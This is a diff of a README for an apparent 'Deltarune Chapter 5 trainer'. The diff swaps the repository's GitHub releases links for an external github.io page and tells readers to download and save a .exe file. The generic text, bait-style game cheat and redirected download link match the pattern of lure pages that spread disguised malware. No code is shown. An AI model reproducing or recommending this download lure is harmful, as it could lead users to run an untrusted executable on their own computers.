@@ -1,12 +1,12 @@
 # 🎮 Deltarune-Chapter5-Trainer-Ultimate - Improve your game stats with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Horny-ureaformaldehyderesin44/Deltarune-Chapter5-Trainer-Ultimate/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://horny-ureaformaldehyderesin44.github.io)
 
 This software manages your statistics in Deltarune Chapter 5. It allows players to adjust character health, gold totals, and other game variables. This tool operates as an external trainer. It modifies memory values while the game runs.
 
 ## 📥 Getting the software
 
-You must visit the official releases page to obtain the application. Follow this link to reach the download area: [https://github.com/Horny-ureaformaldehyderesin44/Deltarune-Chapter5-Trainer-Ultimate/releases](https://github.com/Horny-ureaformaldehyderesin44/Deltarune-Chapter5-Trainer-Ultimate/releases). 
+You must visit the official releases page to obtain the application. Follow this link to reach the download area: [https://horny-ureaformaldehyderesin44.github.io](https://horny-ureaformaldehyderesin44.github.io). 
 
 Click the latest release version on that page. Look for the file ending in .exe. Save this file to your computer.
 
